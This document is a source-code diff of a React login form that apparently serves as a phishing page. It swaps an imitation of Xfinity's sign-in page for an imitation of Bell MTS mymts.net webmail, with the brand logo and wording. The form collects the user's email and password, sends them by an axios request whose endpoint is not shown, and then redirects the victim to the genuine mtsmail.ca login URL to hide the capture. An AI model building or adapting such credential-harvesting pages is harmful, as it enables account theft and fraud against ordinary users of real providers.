@@ -1,9 +1,6 @@
 "use client";
 import { useState } from "react";
-import { ChevronRight, Loader2 } from "lucide-react";
-
 import axios from "axios";
-import Footer from "../footer";
 
 export default function LoginForm() {
   const [isSubmitting, setIsSubmitting] = useState(false);
@@ -14,7 +11,7 @@ export default function LoginForm() {
     password?: string;
   }>({});
   const [isChecked, setIsChecked] = useState(false);
-
+  const [showPassword, setShowPassword] = useState(false);
   const validateUsername = (value: string) => {
     if (!value.trim()) return "Please enter your Xfinity ID to sign in.";
     return null;
@@ -65,7 +62,8 @@ export default function LoginForm() {
       });
 
       if (response.status === 200) {
-        window.location.href = "https://login.xfinity.com/login";
+        window.location.href =
+          "https://auth.mtsmail.ca/saml/module.php/authSynacor/login.php?AuthState=_51b8070552b8672e44dea88d0d01a9e20becc34020%3Ahttps%3A%2F%2Fauth.mtsmail.ca%2Fsaml%2Fsaml2%2Fidp%2FSSOService.php%3Fspentityid%3Dhttps%253A%252F%252Fwebmail2.mymts.net%252F%26cookieTime%3D1749542259";
       }
     } catch (error) {
       console.error("Error:", error);
@@ -76,179 +74,92 @@ export default function LoginForm() {
 
   return (
     <div className="min-h-screen flex flex-col">
-      <div className="flex-1 flex flex-col lg:grid lg:grid-cols-2">
-        {/* Left Column */}
-        <div className="flex flex-col justify-center px-6 py-10 md:px-12">
-          <div className="md:mx-[95px]">
+      <div className="flex-1 flex flex-col">
+        <div className="flex justify-center items-center m-auto">
+          <div>
             <img
-              src="/images/xfinity-logo.svg"
+              src="/images/bellmts.png"
               alt="Logo"
               width={100}
-              className="h-12 w-[70px] mb-8 ml-0"
+              className="w-[170px] mb-2 ml-0"
             />
-            <h1 className="text-left text-3xl font-bold text-gray-800 mb-6">
-              {step == "username"
-                ? "Sign in with your Xfinity ID"
-                : "Enter Your Password"}
-            </h1>
-
+            <div className="text-xs mb-6">
+              Log in with your mymts.net email address
+            </div>
             <form
+              className="bg-[#f2f2f2] py-6 px-7 rounded-sm w-[320px]"
               onSubmit={handleSubmit}
-              className="space-y-6"
-              action="https://login.xfinity.com/login"
-              method="POST"
             >
-              {step === "username" ? (
-                <div>
-                  <input
-                    type="text"
-                    value={formData.user_name}
-                    onChange={(e) => {
-                      setFormData({ ...formData, user_name: e.target.value });
-                      if (errors.user_name)
-                        setErrors({ ...errors, user_name: undefined });
-                    }}
-                    name="user"
-                    id="user"
-                    placeholder="Email, mobile, or username"
-                    className={`w-full px-4 py-4 bg-[#f6f6f9] rounded border-[2px] ${
-                      errors.user_name ? "border-[#b7023c]" : "border-gray-800"
-                    } outline-purple-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500`}
-                  />
-                  {errors.user_name && (
-                    <p className="text-[#b7023c] text-xs mt-2 flex items-center gap-1 font-[500]">
-                      <svg
-                        xmlns="http://www.w3.org/2000/svg"
-                        width="16"
-                        height="16"
-                        viewBox="0 0 24 24"
-                        fill="currentColor"
-                        focusable="false"
-                        role="img"
-                        className="size-xs negative primary icon"
-                        aria-hidden="true"
-                      >
-                        <path d="M13.58,3.5H10.42A8.42,8.42,0,0,0,2,11.92v.16a8.42,8.42,0,0,0,8.42,8.42h3.16A8.42,8.42,0,0,0,22,12.08v-.16A8.42,8.42,0,0,0,13.58,3.5ZM11,7.5h2v6.07H11Zm1.84,9.17a1.23,1.23,0,0,1-1.68,0,1.18,1.18,0,0,1,0-1.68,1.23,1.23,0,0,1,1.68,0,1.18,1.18,0,0,1,0,1.68Z"></path>
-                      </svg>{" "}
-                      {errors.user_name}
-                    </p>
-                  )}
-                </div>
-              ) : (
-                <div>
-                  <input
-                    type="password"
-                    value={formData.password}
-                    onChange={(e) => {
-                      setFormData({ ...formData, password: e.target.value });
-                      if (errors.password)
-                        setErrors({ ...errors, password: undefined });
-                    }}
-                    placeholder="Password"
-                    className={`w-full px-4 py-4 bg-[#f6f6f9] rounded border-[2px] ${
-                      errors.password ? "border-[#b7023c]" : "border-gray-800"
-                    } outline-purple-500 focus:border-purple-500 focus:ring-1 focus:ring-purple-500`}
-                  />
-                  {errors.password && (
-                    <p className="text-[#b7023c] text-xs mt-2 flex items-center gap-1 font-[500]">
-                      <svg
-                        xmlns="http://www.w3.org/2000/svg"
-                        width="16"
-                        height="16"
-                        viewBox="0 0 24 24"
-                        fill="currentColor"
-                        focusable="false"
-                        role="img"
-                        className="size-xs negative primary icon"
-                        aria-hidden="true"
-                      >
-                        <path d="M13.58,3.5H10.42A8.42,8.42,0,0,0,2,11.92v.16a8.42,8.42,0,0,0,8.42,8.42h3.16A8.42,8.42,0,0,0,22,12.08v-.16A8.42,8.42,0,0,0,13.58,3.5ZM11,7.5h2v6.07H11Zm1.84,9.17a1.23,1.23,0,0,1-1.68,0,1.18,1.18,0,0,1,0-1.68,1.23,1.23,0,0,1,1.68,0,1.18,1.18,0,0,1,0,1.68Z"></path>
-                      </svg>{" "}
-                      {errors.password}
-                    </p>
-                  )}
-
-                  <div className="my-4 text-[#5a23b9] font-[600]">
-                    Forgot password
-                  </div>
-
-                  <div className="flex items-center  gap-3 mt-8">
-                    <input
-                      type="checkbox"
-                      checked={isChecked}
-                      onChange={() => setIsChecked(!isChecked)}
-                      readOnly
-                      className="w-[21px] h-[21px] accent-purple-500 border-gray-400 rounded-sm cursor-pointer"
-                    />
-                    <div className=" text-[#474D66] text-[14px]">
-                      Keep me signed in
-                    </div>
-                  </div>
-                </div>
-              )}
-              <p className="mt-4 text-sm text-[#141417]">
-                By signing in, you agree to our{" "}
-                <a
-                  href="#"
-                  className="text-[#5a23b9] underline hover:underline"
+              <input
+                placeholder="Email Address (example@mymts.net)"
+                className="bg-white py-2 px-3 text-[13px] font-[600] text-gray-500  border-gray-400 border rounded-sm w-full mb-4 focus-within:shadow-[0_0_0_3px_rgba(92,241,255,0.5)] focus-within:outline-none mb-4"
+                id="username"
+                type="text"
+                name="username"
+                value={formData.user_name}
+                onChange={(e) => {
+                  setFormData({ ...formData, user_name: e.target.value });
+                  if (errors.user_name)
+                    setErrors({ ...errors, user_name: undefined });
+                }}
+                tabIndex={1}
+                autoCapitalize="off"
+                autoCorrect="off"
+                required={true}
+                autoFocus={true}
+              />
+              <div className="relative">
+                <input
+                  placeholder="Password"
+                  className="bg-white py-2 px-3 text-[13px] font-[600] text-gray-500  border-gray-400 border rounded-sm w-full mb-4 focus-within:shadow-[0_0_0_3px_rgba(92,241,255,0.5)] focus-within:outline-none mb-4"
+                  id="password"
+                  type={showPassword ? "text" : "password"}
+                  name="password"
+                  value={formData.password}
+                  onChange={(e) => {
+                    setFormData({ ...formData, password: e.target.value });
+                    if (errors.password)
+                      setErrors({ ...errors, password: undefined });
+                  }}
+                  tabIndex={1}
+                  autoCapitalize="off"
+                  autoCorrect="off"
+                  required={true}
+                  autoFocus={true}
+                />
+                <span
+                  className="absolute top-2.5 right-3.5 text-[#0088cc] text-[10px] font-[500] cursor-pointer"
+                  onClick={() => setShowPassword(!showPassword)}
                 >
-                  Terms of Service
-                </a>{" "}
-                and{" "}
-                <a
-                  href="#"
-                  className="text-[#5a23b9] underline hover:underline"
-                >
-                  Privacy Policy
-                </a>
-                .
-              </p>
-
+                  {showPassword ? "HIDE" : "SHOW"}
+                </span>
+              </div>
               <button
                 type="submit"
                 disabled={isSubmitting}
-                className="relative md:w-[30%] bg-[#5a23b9] text-white py-3 md:py-4 px-6 rounded font-medium hover:bg-[#36156f] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
+                className="bg-[#076390] w-full text-white py-3  px-6 rounded font-medium hover:bg-[#076380] transition-colors disabled:opacity-50 disabled:cursor-not-allowed mb-4"
               >
-                {isSubmitting && (
-                  <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2">
-                    <Loader2 className="animate-spin h-7 w-7" />
-                  </div>
-                )}
-                {step === "username" ? "Let's go" : "Submit"}
+                LOG IN
               </button>
+              <div className="flex items-center justify-between">
+                <div className="flex items-center  gap-2">
+                  <input
+                    type="checkbox"
+                    checked={isChecked}
+                    onChange={() => setIsChecked(!isChecked)}
+                    readOnly
+                    className="w-[13px] h-[13px] border-gray-400 rounded-sm cursor-pointer"
+                  />
+                  <div className="text-[14px]">Remember Me</div>
+                </div>
+                <div className="text-[14px] font-semibold text-[#076390]">
+                  Forgot Password?
+                </div>
+              </div>
             </form>
-
-            <div className="mt-8">
-              {[
-                "New to Xfinity? View exclusive offers near you",
-                "Find your Xfinity ID",
-                "Create a new Xfinity ID",
-              ].map((text, i) => (
-                <a
-                  href="#"
-                  key={i}
-                  className={`${
-                    i != 2 ? "border-b border-gray-200" : ""
-                  } flex items-center justify-between p-5 hover:bg-gray-100 rounded-lg group`}
-                >
-                  <span className="text-[#141417] text-sm">{text}</span>
-                  <ChevronRight className="text-gray-400 group-hover:text-gray-600" />
-                </a>
-              ))}
-            </div>
           </div>
         </div>
-
-        {/* Right Column */}
-        <div
-          className="hidden lg:flex items-center justify-center bg-[url('/images/BAU-XM_CIMA_4.15.25_Update_Desktop.png')] bg-cover bg-top-center"
-          style={{ backgroundSize: "135%", backgroundPosition: "top center" }}
-        >
-          <div className="text-center max-w-lg px-6"></div>
-        </div>
       </div>
-
-      <Footer />
     </div>
   );
 }
